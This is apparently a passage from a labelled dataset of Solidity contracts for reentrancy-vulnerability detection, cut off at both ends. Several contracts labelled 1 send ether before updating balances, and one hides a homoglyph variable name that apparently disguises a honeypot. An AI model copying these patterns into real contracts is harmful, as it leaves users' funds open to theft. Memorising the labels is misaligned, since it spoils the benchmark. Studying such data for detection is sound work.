function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) { uint ptr = selfptr; uint idx; if (needlelen <= selflen) { if (needlelen <= 32) { bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1)); bytes32 needledata; assembly { needledata := and(mload(needleptr), mask) } uint end = selfptr + selflen - needlelen; bytes32 ptrdata; assembly { ptrdata := and(mload(ptr), mask) } while (ptrdata != needledata) { if (ptr >= end) return selfptr + selflen; ptr++; assembly { ptrdata := and(mload(ptr), mask) } } return ptr; } else { bytes32 hash; assembly { hash := sha3(needleptr, needlelen) } for (idx = 0; idx <= selflen - needlelen; idx++) { bytes32 testHash; assembly { testHash := sha3(ptr, needlelen) } if (hash == testHash) return ptr; ptr += 1; } } } return selfptr + selflen; } function rfindPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) { uint ptr; if (needlelen <= selflen) { if (needlelen <= 32) { bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1)); bytes32 needledata; assembly { needledata := and(mload(needleptr), mask) } ptr = selfptr + selflen - needlelen; bytes32 ptrdata; assembly { ptrdata := and(mload(ptr), mask) } while (ptrdata != needledata) { if (ptr <= selfptr) return selfptr; ptr--; assembly { ptrdata := and(mload(ptr), mask) } } return ptr + needlelen; } else { bytes32 hash; assembly { hash := sha3(needleptr, needlelen) } ptr = selfptr + (selflen - needlelen); while (ptr >= selfptr) { bytes32 testHash; assembly { testHash := sha3(ptr, needlelen) } if (hash == testHash) return ptr + needlelen; ptr -= 1; } } } return selfptr; } function find(slice self, slice needle) internal pure returns (slice) { uint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr); self._len -= ptr - self._ptr; self._ptr = ptr; return self; } function rfind(slice self, slice needle) internal pure returns (slice) { uint ptr = rfindPtr(self._len, self._ptr, needle._len, needle._ptr); self._len = ptr - self._ptr; return self; } function split(slice self, slice needle, slice token) internal pure returns (slice) { uint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr); token._ptr = self._ptr; token._len = ptr - self._ptr; if (ptr == self._ptr + self._len) { self._len = 0; } else { self._len -= token._len + needle._len; self._ptr = ptr + needle._len; } return token; } function split(slice self, slice needle) internal pure returns (slice token) { split(self, needle, token); } function rsplit(slice self, slice needle, slice token) internal pure returns (slice) { uint ptr = rfindPtr(self._len, self._ptr, needle._len, needle._ptr); token._ptr = ptr; token._len = self._len - (ptr - self._ptr); if (ptr == self._ptr) { self._len = 0; } else { self._len -= token._len + needle._len; } return token; } function rsplit(slice self, slice needle) internal pure returns (slice token) { rsplit(self, needle, token); } function count(slice self, slice needle) internal pure returns (uint cnt) { uint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr) + needle._len; while (ptr <= self._ptr + self._len) { cnt++; ptr = findPtr(self._len - (ptr - self._ptr), ptr, needle._len, needle._ptr) + needle._len; } } function contains(slice self, slice needle) internal pure returns (bool) { return rfindPtr(self._len, self._ptr, needle._len, needle._ptr) != self._ptr; } function concat(slice self, slice other) internal pure returns (string) { string memory ret = new string(self._len + other._len); uint retptr; assembly { retptr := add(ret, 32) } memcpy(retptr, self._ptr, self._len); memcpy(retptr + self._len, other._ptr, other._len); return ret; } function join(slice self, slice[] parts) internal pure returns (string) { if (parts.length == 0) return \"\"; uint length = self._len * (parts.length - 1); for(uint i = 0; i < parts.length; i++) length += parts[i]._len; string memory ret = new string(length); uint retptr; assembly { retptr := add(ret, 32) } for(i = 0; i < parts.length; i++) { memcpy(retptr, parts[i]._ptr, parts[i]._len); retptr += parts[i]._len; if (i < parts.length - 1) { memcpy(retptr, self._ptr, self._len); retptr += self._len; } } return ret; } } contract MyWill { using strings for *; address club; address owner; string listWitnesses; string listHeirs; string listHeirsPercentages; mapping (string => bool) mapHeirsVoteOwnerHasDied; enum Status {CREATED, ALIVE, DEAD} Status status; event Deposit(address from, uint value); event SingleTransact(address owner, uint value, address to, bytes data); function MyWill (address _owner, string _listHeirs, string _listHeirsPercentages, string _listWitnesses, address _club) { club = _club; owner = _owner; status = Status.CREATED; listHeirs = _listHeirs; listHeirsPercentages = _listHeirsPercentages; listWitnesses = _listWitnesses; var s = _listHeirsPercentages.toSlice().copy(); var delim = \";\".toSlice(); var parts = new uint256[](s.count(delim) + 1); uint256 countPercentage; for(uint i = 0; i < parts.length; i++) { countPercentage = countPercentage + stringToUint(s.split(delim).toString()); } require(countPercentage == 100000); } modifier onlyOwner() { require(msg.sender == owner); _; } modifier onlyAlive() { require(status == Status.ALIVE || status == Status.CREATED); _; } modifier onlyDead() { require(status == Status.DEAD); _; } modifier onlyHeir() { var s = listHeirs.toSlice().copy(); var delim = \";\".toSlice(); string[] memory listOfHeirs = new string[](s.count(delim) + 1); bool itsHeir = false; string memory senderStringAddress = addressToString(msg.sender); for(uint i = 0; i < listOfHeirs.length; i++) { if(keccak256(senderStringAddress) == keccak256(s.split(delim).toString())){ itsHeir = true; break; } } require(itsHeir); _; } modifier onlyWitness() { var s = listWitnesses.toSlice().copy(); var delim = \";\".toSlice(); string[] memory arrayOfWitnesses = new string[](s.count(delim) + 1); bool itsWitness = false; string memory senderStringAddress = addressToString(msg.sender); for(uint i = 0; i < arrayOfWitnesses.length; i++) { if(keccak256(senderStringAddress) == keccak256(s.split(delim).toString())){ itsWitness = true; break; } } require(itsWitness); _; } function () payable onlyAlive { if (status == Status.CREATED) { var witnessesList = listWitnesses.toSlice().copy(); var witnessesLength = witnessesList.count(\";\".toSlice()) + 1; var needed = 1000000000000000 * witnessesLength + 5000000000000000; require(msg.value > needed); for (uint i = 0; i < witnessesLength; i++) { var witnessAddress = parseAddr(witnessesList.split(\";\".toSlice()).toString()); witnessAddress.transfer(1000000000000000); } club.transfer(5000000000000000); status = Status.ALIVE; Deposit(msg.sender, msg.value - needed); } else { Deposit(msg.sender, msg.value); } } function ownerDied() onlyWitness onlyAlive { require (this.balance > 0); mapHeirsVoteOwnerHasDied[addressToString(msg.sender)] = true; var users = listWitnesses.toSlice().copy(); uint256 listLength = users.count(\";\".toSlice()) + 1; uint8 count = 0; for(uint i = 0; i < listLength; i++) { if(mapHeirsVoteOwnerHasDied[users.split(\";\".toSlice()).toString()] == true){ count = count + 1; } } if(count == listLength){ users = listHeirs.toSlice().copy(); var  percentages = listHeirsPercentages.toSlice().copy(); listLength = users.count(\";\".toSlice()) + 1; for(i = 0; i < listLength - 1; i++) { parseAddr(users.split(\";\".toSlice()).toString()).transfer(((this.balance * stringToUint(percentages.split(\";\".toSlice()).toString())) / 100000)); } parseAddr(users.split(\";\".toSlice()).toString()).transfer(this.balance); status = Status.DEAD; } } function execute(address _to, uint _value, bytes _data) external onlyOwner { SingleTransact(msg.sender, _value, _to, _data); _to.call.value(_value)(_data); } function isOwner() returns (bool){ return msg.sender == owner; } function getStatus() returns (Status){ return status; } function getHeirs() returns (string, string) { return (listHeirs, listHeirsPercentages); } function getWitnesses() returns (string) { return listWitnesses; } function getWitnessesCount() returns (uint) { return listWitnesses.toSlice().copy().count(\";\".toSlice()) + 1; } function getBalance() constant returns (uint) { return  address(this).balance; } function hasVoted() returns (bool){ return mapHeirsVoteOwnerHasDied[addressToString(msg.sender)]; } function stringToUint(string s) constant private returns (uint result) { bytes memory b = bytes(s); uint i; result = 0; for (i = 0; i < b.length; i++) { uint c = uint(b[i]); if (c >= 48 && c <= 57) { result = result * 10 + (c - 48); } } } function addressToString(address x) private returns (string) { bytes memory s = new bytes(42); s[0] = \"0\"; s[1] = \"x\"; for (uint i = 0; i < 20; i++) { byte b = byte(uint8(uint(x) / (2**(8*(19 - i))))); byte hi = byte(uint8(b) / 16); byte lo = byte(uint8(b) - 16 * uint8(hi)); s[2+2*i] = char(hi); s[2+2*i+1] = char(lo); } return string(s); } function char(byte b) private returns (byte c) { if (b < 10) return byte(uint8(b) + 0x30); else return byte(uint8(b) + 0x57); } function parseAddr(string _a) internal returns (address){ bytes memory tmp = bytes(_a); uint160 iaddr = 0; uint160 b1; uint160 b2; for (uint i=2; i<2+2*20; i+=2){ iaddr *= 256; b1 = uint160(tmp[i]); b2 = uint160(tmp[i+1]); if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87; else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48; if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87; else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48; iaddr += (b1*16+b2); } return address(iaddr); } } "}
{"sol name": "36645.sol", "label": 0, "first path": "function purchase_tokens() { require(msg.sender == developer); if (this.balance < eth_minimum) return; if (kill_switch) return; require(sale != 0x0); bought_tokens = true; contract_eth_value = this.balance; require(sale.call.value(contract_eth_value)()); require(this.balance==0); ", "second path": "function purchase_tokens() { require(msg.sender == developer); if (this.balance < eth_minimum) return; if (kill_switch) return; require(sale != 0x0); bought_tokens = true; contract_eth_value = this.balance; require(sale.call.value(contract_eth_value)()); require(this.balance==0); ", "third path": "function purchase_tokens() { require(msg.sender == developer); if (this.balance < eth_minimum) return; if (kill_switch) return; require(sale != 0x0); bought_tokens = true; contract_eth_value = this.balance; require(sale.call.value(contract_eth_value)()); require(this.balance==0); ", "long path": "pragma solidity ^0.4.13; contract ERC20 { function transfer(address _to, uint256 _value) returns (bool success); function balanceOf(address _owner) constant returns (uint256 balance); } contract EnjinBuyer { mapping (address => uint256) public balances; mapping (address => uint256) public balances_after_buy; bool public bought_tokens; bool public token_set; bool public refunded; uint256 public contract_eth_value; bool public kill_switch; bytes32 password_hash = 0x8bf0720c6e610aace867eba51b03ab8ca908b665898b10faddc95a96e829539d; address public developer = 0x0639C169D9265Ca4B4DEce693764CdA8ea5F3882; address public sale = 0xc4740f71323129669424d1Ae06c42AEE99da30e2; ERC20 public token; uint256 public eth_minimum = 3235 ether; function set_token(address _token) { require(msg.sender == developer); token = ERC20(_token); token_set = true; } function set_refunded(bool _refunded) { require(msg.sender == developer); refunded = _refunded; } function activate_kill_switch(string password) { require(msg.sender == developer || sha3(password) == password_hash); kill_switch = true; } function personal_withdraw(){ if (balances_after_buy[msg.sender]>0 && msg.sender != sale) { uint256 eth_to_withdraw_after_buy = balances_after_buy[msg.sender]; balances_after_buy[msg.sender] = 0; msg.sender.transfer(eth_to_withdraw_after_buy); } if (balances[msg.sender] == 0) return; require(msg.sender != sale); if (!bought_tokens || refunded) { uint256 eth_to_withdraw = balances[msg.sender]; balances[msg.sender] = 0; msg.sender.transfer(eth_to_withdraw); } else { require(token_set); uint256 contract_token_balance = token.balanceOf(address(this)); require(contract_token_balance != 0); uint256 tokens_to_withdraw = (balances[msg.sender] * contract_token_balance) / contract_eth_value; contract_eth_value -= balances[msg.sender]; balances[msg.sender] = 0; uint256 fee = tokens_to_withdraw / 100; require(token.transfer(developer, fee)); require(token.transfer(msg.sender, tokens_to_withdraw - fee)); } } function withdraw(address user){ require(bought_tokens || kill_switch); require(user != sale); if (balances_after_buy[user]>0 && user != sale) { uint256 eth_to_withdraw_after_buy = balances_after_buy[user]; balances_after_buy[user] = 0; user.transfer(eth_to_withdraw_after_buy); } if (balances[user] == 0) return; if (!bought_tokens || refunded) { uint256 eth_to_withdraw = balances[user]; balances[user] = 0; user.transfer(eth_to_withdraw); } else { require(token_set); uint256 contract_token_balance = token.balanceOf(address(this)); require(contract_token_balance != 0); uint256 tokens_to_withdraw = (balances[user] * contract_token_balance) / contract_eth_value; contract_eth_value -= balances[user]; balances[user] = 0; uint256 fee = tokens_to_withdraw / 100; require(token.transfer(developer, fee)); require(token.transfer(user, tokens_to_withdraw - fee)); } } function purchase_tokens() { require(msg.sender == developer); if (this.balance < eth_minimum) return; if (kill_switch) return; require(sale != 0x0); bought_tokens = true; contract_eth_value = this.balance; require(sale.call.value(contract_eth_value)()); require(this.balance==0); } function () payable { if (!bought_tokens) { balances[msg.sender] += msg.value; } else { balances_after_buy[msg.sender] += msg.value; if (msg.sender == sale && this.balance >= contract_eth_value) { refunded = true; } } } } "}
{"sol name": "39749.sol", "label": 0, "first path": "function calcRefund(address _addressToRefund) internal { uint amount = balanceOf[_addressToRefund]; balanceOf[_addressToRefund] = 0; if (amount > 0) { if (_addressToRefund.call.value(amount)()) { LogFundTransfer(_addressToRefund, amount, false); } else { balanceOf[_addressToRefund] = amount; function safeWithdraw() public onlyAfterDeadline { if (amountRaised >= fundingGoal){ fundingGoalReached = true; LogGoalReached(bankRollBeneficiary, amountRaised); crowdsaleClosed = true; if (!fundingGoalReached) { calcRefund(msg.sender); if (msg.sender == owner && fundingGoalReached) { bankrollBeneficiaryAmount = (this.balance*80)/100; if (bankRollBeneficiary.send(bankrollBeneficiaryAmount)) { LogFundTransfer(bankRollBeneficiary, bankrollBeneficiaryAmount, false); etherollBeneficiaryAmount = this.balance; if(!etherollBeneficiary.send(etherollBeneficiaryAmount)) throw; LogFundTransfer(etherollBeneficiary, etherollBeneficiaryAmount, false); } else { fundingGoalReached = false; function emergencyWithdraw() public isEmergency { calcRefund(msg.sender); ", "second path": "function calcRefund(address _addressToRefund) internal { uint amount = balanceOf[_addressToRefund]; balanceOf[_addressToRefund] = 0; if (amount > 0) { if (_addressToRefund.call.value(amount)()) { LogFundTransfer(_addressToRefund, amount, false); } else { balanceOf[_addressToRefund] = amount; function safeWithdraw() public onlyAfterDeadline { if (amountRaised >= fundingGoal){ fundingGoalReached = true; LogGoalReached(bankRollBeneficiary, amountRaised); crowdsaleClosed = true; if (!fundingGoalReached) { calcRefund(msg.sender); if (msg.sender == owner && fundingGoalReached) { bankrollBeneficiaryAmount = (this.balance*80)/100; if (bankRollBeneficiary.send(bankrollBeneficiaryAmount)) { LogFundTransfer(bankRollBeneficiary, bankrollBeneficiaryAmount, false); etherollBeneficiaryAmount = this.balance; if(!etherollBeneficiary.send(etherollBeneficiaryAmount)) throw; LogFundTransfer(etherollBeneficiary, etherollBeneficiaryAmount, false); } else { fundingGoalReached = false; function emergencyWithdraw() public isEmergency { calcRefund(msg.sender); ", "third path": "function calcRefund(address _addressToRefund) internal { uint amount = balanceOf[_addressToRefund]; balanceOf[_addressToRefund] = 0; if (amount > 0) { if (_addressToRefund.call.value(amount)()) { LogFundTransfer(_addressToRefund, amount, false); } else { balanceOf[_addressToRefund] = amount; function safeWithdraw() public onlyAfterDeadline { if (amountRaised >= fundingGoal){ fundingGoalReached = true; LogGoalReached(bankRollBeneficiary, amountRaised); crowdsaleClosed = true; if (!fundingGoalReached) { calcRefund(msg.sender); if (msg.sender == owner && fundingGoalReached) { bankrollBeneficiaryAmount = (this.balance*80)/100; if (bankRollBeneficiary.send(bankrollBeneficiaryAmount)) { LogFundTransfer(bankRollBeneficiary, bankrollBeneficiaryAmount, false); etherollBeneficiaryAmount = this.balance; if(!etherollBeneficiary.send(etherollBeneficiaryAmount)) throw; LogFundTransfer(etherollBeneficiary, etherollBeneficiaryAmount, false); } else { fundingGoalReached = false; function emergencyWithdraw() public isEmergency { calcRefund(msg.sender); ", "long path": "pragma solidity ^0.4.2; contract token { function transfer(address _receiver, uint _amount) returns (bool success) { } function priviledgedAddressBurnUnsoldCoins(){ } } contract owned { address public owner; function owned() { owner = msg.sender; } modifier onlyOwner { if (msg.sender != owner) throw; _; } function ownerTransferOwnership(address newOwner) onlyOwner { owner = newOwner; } } contract DSSafeAddSub { function safeToAdd(uint a, uint b) internal returns (bool) { return (a + b >= a); } function safeAdd(uint a, uint b) internal returns (uint) { if (!safeToAdd(a, b)) throw; return a + b; } function safeToSubtract(uint a, uint b) internal returns (bool) { return (b <= a); } function safeSub(uint a, uint b) internal returns (uint) { if (!safeToSubtract(a, b)) throw; return a - b; } } contract EtherollCrowdfund is owned, DSSafeAddSub { modifier onlyAfterDeadline() { if (now < deadline) throw; _; } modifier isEmergency() { if (!emergency) throw; _; } uint public fundingGoal; uint public weekTwoPriceRiseBegin = now + 10080 * 1 minutes; address public bankRollBeneficiary; address public etherollBeneficiary; uint public amountRaised; uint public deadline; uint public price = 10000000000000000; token public tokenReward; bool public crowdsaleClosed = false; uint public bankrollBeneficiaryAmount; uint public etherollBeneficiaryAmount; mapping (address => uint) public balanceOf; bool public fundingGoalReached = false; bool public emergency = false; event LogFundTransfer(address indexed Backer, uint indexed Amount, bool indexed IsContribution); event LogGoalReached(address indexed Beneficiary, uint indexed AmountRaised); function EtherollCrowdfund( address _ifSuccessfulSendToBeneficiary, address _ifSuccessfulSendToEtheroll, uint _fundingGoalInEthers, uint _durationInMinutes, token _addressOfTokenUsedAsReward ) { bankRollBeneficiary = _ifSuccessfulSendToBeneficiary; etherollBeneficiary = _ifSuccessfulSendToEtheroll; fundingGoal = _fundingGoalInEthers * 1 ether; deadline = now + _durationInMinutes * 1 minutes; tokenReward = token(_addressOfTokenUsedAsReward); } function () payable { if(now > deadline) crowdsaleClosed = true; if (crowdsaleClosed) throw; if (msg.value == 0) throw; if(now < weekTwoPriceRiseBegin) { if(tokenReward.transfer(msg.sender, ((msg.value*price)/price)*2)) { LogFundTransfer(msg.sender, msg.value, true); } else { throw; } }else{ if(tokenReward.transfer(msg.sender, (msg.value*price)/price)) { LogFundTransfer(msg.sender, msg.value, true); } else { throw; } } amountRaised = safeAdd(amountRaised, msg.value); balanceOf[msg.sender] = safeAdd(balanceOf[msg.sender], msg.value); } function safeWithdraw() public onlyAfterDeadline { if (amountRaised >= fundingGoal){ fundingGoalReached = true; LogGoalReached(bankRollBeneficiary, amountRaised); } crowdsaleClosed = true; if (!fundingGoalReached) { calcRefund(msg.sender); } if (msg.sender == owner && fundingGoalReached) { bankrollBeneficiaryAmount = (this.balance*80)/100; if (bankRollBeneficiary.send(bankrollBeneficiaryAmount)) { LogFundTransfer(bankRollBeneficiary, bankrollBeneficiaryAmount, false); etherollBeneficiaryAmount = this.balance; if(!etherollBeneficiary.send(etherollBeneficiaryAmount)) throw; LogFundTransfer(etherollBeneficiary, etherollBeneficiaryAmount, false); } else { fundingGoalReached = false; } } } function calcRefund(address _addressToRefund) internal { uint amount = balanceOf[_addressToRefund]; balanceOf[_addressToRefund] = 0; if (amount > 0) { if (_addressToRefund.call.value(amount)()) { LogFundTransfer(_addressToRefund, amount, false); } else { balanceOf[_addressToRefund] = amount; } } } function emergencyWithdraw() public isEmergency { calcRefund(msg.sender); } function ownerSetEmergencyStatus(bool _newEmergencyStatus) public onlyOwner { crowdsaleClosed = _newEmergencyStatus; emergency = _newEmergencyStatus; } function ownerBurnUnsoldTokens() onlyOwner onlyAfterDeadline { tokenReward.priviledgedAddressBurnUnsoldCoins(); } } "}
{"sol name": "36334.sol", "label": 0, "first path": "function buy_the_tokens() { require(msg.sender == owner); require(!bought_tokens); require(sale != 0x0); require(this.balance >= min_required_amount); bought_tokens = true; contract_eth_value = this.balance; require(sale.call.value(contract_eth_value)()); ", "second path": "function buy_the_tokens() { require(msg.sender == owner); require(!bought_tokens); require(sale != 0x0); require(this.balance >= min_required_amount); bought_tokens = true; contract_eth_value = this.balance; require(sale.call.value(contract_eth_value)()); ", "third path": "function buy_the_tokens() { require(msg.sender == owner); require(!bought_tokens); require(sale != 0x0); require(this.balance >= min_required_amount); bought_tokens = true; contract_eth_value = this.balance; require(sale.call.value(contract_eth_value)()); ", "long path": "pragma solidity ^0.4.16; contract ERC20 { function transfer(address _to, uint256 _value) returns (bool success); function balanceOf(address _owner) constant returns (uint256 balance); } contract RequestSale { mapping (address => uint256) public balances; bool public bought_tokens; uint256 public contract_eth_value; uint256 public eth_cap = 500 ether; uint256 constant public min_required_amount = 60 ether; address public owner; address public sale = 0xa579E31b930796e3Df50A56829cF82Db98b6F4B3; function RequestSale() { owner = msg.sender; } function perform_withdrawal(address tokenAddress) { require(bought_tokens); ERC20 token = ERC20(tokenAddress); uint256 contract_token_balance = token.balanceOf(address(this)); require(contract_token_balance != 0); uint256 tokens_to_withdraw = (balances[msg.sender] * contract_token_balance) / contract_eth_value; contract_eth_value -= balances[msg.sender]; balances[msg.sender] = 0; require(token.transfer(msg.sender, tokens_to_withdraw)); } function refund_me() { uint256 eth_to_withdraw = balances[msg.sender]; balances[msg.sender] = 0; msg.sender.transfer(eth_to_withdraw); } function buy_the_tokens() { require(msg.sender == owner); require(!bought_tokens); require(sale != 0x0); require(this.balance >= min_required_amount); bought_tokens = true; contract_eth_value = this.balance; require(sale.call.value(contract_eth_value)()); } function upgrade_cap() { require(msg.sender == owner); eth_cap = 1000 ether; } function () payable { require(!bought_tokens); require(this.balance + msg.value < eth_cap); balances[msg.sender] += msg.value; } } "}
{"sol name": "28687.sol", "label": 1, "first path": "function CashOut(uint _am)  { if(_am<=balances[msg.sender]) { if(msg.sender.call.value(_am)()) { balances[msg.sender]-=_am; TransferLog.AddMessage(msg.sender,_am,\"CashOut\"); function() public payable{} contract Log struct Message address Sender; string  Data; uint Val; uint  Time; Message[] public History; Message LastMsg; ", "second path": "function CashOut(uint _am)  { if(_am<=balances[msg.sender]) { if(msg.sender.call.value(_am)()) { balances[msg.sender]-=_am; TransferLog.AddMessage(msg.sender,_am,\"CashOut\"); function() public payable{} contract Log struct Message address Sender; string  Data; uint Val; uint  Time; Message[] public History; Message LastMsg; ", "third path": "function CashOut(uint _am)  { if(_am<=balances[msg.sender]) { if(msg.sender.call.value(_am)()) { balances[msg.sender]-=_am; TransferLog.AddMessage(msg.sender,_am,\"CashOut\"); function() public payable{} contract Log struct Message address Sender; string  Data; uint Val; uint  Time; Message[] public History; Message LastMsg; ", "long path": "pragma solidity ^0.4.19; contract PrivateBank { mapping (address => uint) public balances; uint public MinDeposit = 1 ether; Log TransferLog; function PrivateBank(address _log) { TransferLog = Log(_log); } function Deposit() public payable { if(msg.value >= MinDeposit) { balances[msg.sender]+=msg.value; TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\"); } } function CashOut(uint _am)  { if(_am<=balances[msg.sender]) { if(msg.sender.call.value(_am)()) { balances[msg.sender]-=_am; TransferLog.AddMessage(msg.sender,_am,\"CashOut\"); } } } function() public payable{} } contract Log { struct Message { address Sender; string  Data; uint Val; uint  Time; } Message[] public History; Message LastMsg; function AddMessage(address _adr,uint _val,string _data) public { LastMsg.Sender = _adr; LastMsg.Time = now; LastMsg.Val = _val; LastMsg.Data = _data; History.push(LastMsg); } } "}
{"sol name": "1430.sol", "label": 0, "first path": "function callContract(address to, bytes data) onlyOwner public payable returns (bool) { require(to.call.value(msg.value)(data)); return true; ", "second path": "function callContract(address to, bytes data) onlyOwner public payable returns (bool) { require(to.call.value(msg.value)(data)); return true; ", "third path": "function callContract(address to, bytes data) onlyOwner public payable returns (bool) { require(to.call.value(msg.value)(data)); return true; ", "long path": "pragma solidity ^0.4.24; contract ERC { function balanceOf (address) public view returns (uint256); function allowance (address, address) public view returns (uint256); function transfer (address, uint256) public returns (bool); function transferFrom (address, address, uint256) public returns (bool); function transferAndCall(address, uint256, bytes) public payable returns (bool); function approve (address, uint256) public returns (bool); } contract FsTKerWallet { string constant public walletVersion = \"v1.0.0\"; ERC public FST; address public owner; bytes32 public secretHash; uint256 public sn; modifier onlyOwner { require(msg.sender == owner); _; } constructor (ERC _FST, bytes32 _secretHash, uint256 _sn) public { FST = _FST; secretHash = _secretHash; sn = _sn; } function getFSTBalance () public view returns (uint256) { return FST.balanceOf(address(this)); } function getETHBalance () public view returns (uint256) { return address(this).balance; } function getERCBalance (ERC erc) public view returns (uint256) { return erc.balanceOf(address(this)); } function transferETH (address _to, uint256 _value) onlyOwner public returns (bool) { _to.transfer(_value); return true; } function transferMoreETH (address _to, uint256 _value) onlyOwner payable public returns (bool) { _to.transfer(_value); return true; } function transferFST (address _to, uint256 _value) onlyOwner public returns (bool) { return FST.transfer(_to, _value); } function transferERC (ERC erc, address _to, uint256 _value) onlyOwner public returns (bool) { return erc.transfer(_to, _value); } function transferFromFST (address _from, address _to, uint256 _value) onlyOwner public returns (bool) { return FST.transferFrom(_from, _to, _value); } function transferFromERC (ERC erc, address _from, address _to, uint256 _value) onlyOwner public returns (bool) { return erc.transferFrom(_from, _to, _value); } function transferAndCallFST (address _to, uint256 _value, bytes _data) onlyOwner payable public returns (bool) { require(FST.transferAndCall.value(msg.value)(_to, _value, _data)); return true; } function transferAndCallERC (ERC erc, address _to, uint256 _value, bytes _data) onlyOwner payable public returns (bool) { require(erc.transferAndCall.value(msg.value)(_to, _value, _data)); return true; } function approveFST (address _spender, uint256 _value) onlyOwner public returns (bool) { return FST.approve(_spender, _value); } function approveERC (ERC erc, address _spender, uint256 _value) onlyOwner public returns (bool) { return erc.approve(_spender, _value); } function recoverAndSetSecretHash (string _secret, bytes32 _newSecretHash) public returns (bool) { require(_newSecretHash != bytes32(0)); require(keccak256(abi.encodePacked(_secret)) == secretHash); owner = msg.sender; secretHash = _newSecretHash; return true; } function setFST (ERC _FST) onlyOwner public returns (bool) { require(address(_FST) != address(this) && address(_FST) != address(0x0)); FST = _FST; return true; } function callContract(address to, bytes data) onlyOwner public payable returns (bool) { require(to.call.value(msg.value)(data)); return true; } function () external payable {} } "}
{"sol name": "23088.sol", "label": 1, "first path": "function atomicize (address[] addrs, uint[] values, uint[] calldataLengths, bytes calldatas) public{ require(addrs.length == values.length && addrs.length == calldataLengths.length); uint j = 0; for (uint i = 0; i < addrs.length; i++) { bytes memory calldata = new bytes(calldataLengths[i]); for (uint k = 0; k < calldataLengths[i]; k++) { calldata[k] = calldatas[j]; j++; require(addrs[i].call.value(values[i])(calldata)); ", "second path": "function atomicize (address[] addrs, uint[] values, uint[] calldataLengths, bytes calldatas) public{ require(addrs.length == values.length && addrs.length == calldataLengths.length); uint j = 0; for (uint i = 0; i < addrs.length; i++) { bytes memory calldata = new bytes(calldataLengths[i]); for (uint k = 0; k < calldataLengths[i]; k++) { calldata[k] = calldatas[j]; j++; require(addrs[i].call.value(values[i])(calldata)); ", "third path": "function atomicize (address[] addrs, uint[] values, uint[] calldataLengths, bytes calldatas) public{ require(addrs.length == values.length && addrs.length == calldataLengths.length); uint j = 0; for (uint i = 0; i < addrs.length; i++) { bytes memory calldata = new bytes(calldataLengths[i]); for (uint k = 0; k < calldataLengths[i]; k++) { calldata[k] = calldatas[j]; j++; require(addrs[i].call.value(values[i])(calldata)); ", "long path": "pragma solidity ^0.4.13; library WyvernAtomicizer { function atomicize (address[] addrs, uint[] values, uint[] calldataLengths, bytes calldatas) public{ require(addrs.length == values.length && addrs.length == calldataLengths.length); uint j = 0; for (uint i = 0; i < addrs.length; i++) { bytes memory calldata = new bytes(calldataLengths[i]); for (uint k = 0; k < calldataLengths[i]; k++) { calldata[k] = calldatas[j]; j++; } require(addrs[i].call.value(values[i])(calldata)); } } } "}
{"sol name": "Reentrance_02.sol", "label": 1, "first path": "function withdraw(uint _amount) public { if(balances[msg.sender] >= _amount) { if(msg.sender.call.value(_amount)()) { _amount; balances[msg.sender] -= _amount; function() public payable {} ", "second path": "function withdraw(uint _amount) public { if(balances[msg.sender] >= _amount) { if(msg.sender.call.value(_amount)()) { _amount; balances[msg.sender] -= _amount; function() public payable {} ", "third path": "function withdraw(uint _amount) public { if(balances[msg.sender] >= _amount) { if(msg.sender.call.value(_amount)()) { _amount; balances[msg.sender] -= _amount; function() public payable {} ", "long path": "pragma solidity ^0.4.18; contract Reentrance { mapping(address => uint) public balances; function donate(address _to) public payable { balances[_to] += msg.value; } function balanceOf(address _who) public view returns (uint balance) { return balances[_who]; } function withdraw(uint _amount) public { if(balances[msg.sender] >= _amount) { if(msg.sender.call.value(_amount)()) { _amount; } balances[msg.sender] -= _amount; } } function() public payable {} } "}
{"sol name": "26523.sol", "label": 1, "first path": "function claim_reward(uint uid, bytes32 passcode) public payable{ require(msg.value >= parameters[\"price\"]); require(is_passcode_correct(uid, passcode)); uint final_reward = get_reward(uid) + msg.value; if (final_reward > parameters[\"price_po\u03bfl\"]) final_reward = parameters[\"price_po\u03bfl\"]; require(msg.sender.call.value(final_reward)()); parameters[\"price_po\u03bfl\"] -= final_reward; if (uid + 1 < users.length) users[uid] = users[users.length - 1]; users.length -= 1; ", "second path": "function claim_reward(uint uid, bytes32 passcode) public payable{ require(msg.value >= parameters[\"price\"]); require(is_passcode_correct(uid, passcode)); uint final_reward = get_reward(uid) + msg.value; if (final_reward > parameters[\"price_po\u03bfl\"]) final_reward = parameters[\"price_po\u03bfl\"]; require(msg.sender.call.value(final_reward)()); parameters[\"price_po\u03bfl\"] -= final_reward; if (uid + 1 < users.length) users[uid] = users[users.length - 1]; users.length -= 1; ", "third path": "function claim_reward(uint uid, bytes32 passcode) public payable{ require(msg.value >= parameters[\"price\"]); require(is_passcode_correct(uid, passcode)); uint final_reward = get_reward(uid) + msg.value; if (final_reward > parameters[\"price_po\u03bfl\"]) final_reward = parameters[\"price_po\u03bfl\"]; require(msg.sender.call.value(final_reward)()); parameters[\"price_po\u03bfl\"] -= final_reward; if (uid + 1 < users.length) users[uid] = users[users.length - 1]; users.length -= 1; ", "long path": "pragma solidity ^0.4.0; contract HODLerParadise{ struct User{ address hodler; bytes32 passcode; uint hodling_since; } User[] users; mapping (string => uint) parameters; function HODLerParadise() public{ parameters[\"owner\"] = uint(msg.sender); } function get_parameters() constant public returns( uint price, uint price_pool, uint base_reward, uint daily_reward, uint max_reward ){ price = parameters['price']; price_pool = parameters['price_pool']; base_reward = parameters['base_reward']; daily_reward = parameters['daily_reward']; max_reward = parameters['max_reward']; } function register(bytes32 passcode) public payable returns(uint uid) { require(msg.value >= parameters[\"price\"]); require(passcode != \"\"); users.push(User(msg.sender, passcode, now)); parameters[\"price_pool\"] += msg.value * 99 / 100; parameters[\"last_hodler\"] = now; uid = users.length - 1; } function hash_passcode(bytes32 passcode) public pure returns(bytes32 hash){ hash = keccak256(passcode); } function get_reward(uint uid) public constant returns(uint reward){ require(uid < users.length); reward = parameters[\"base_reward\"] + parameters[\"daily_reward\"] 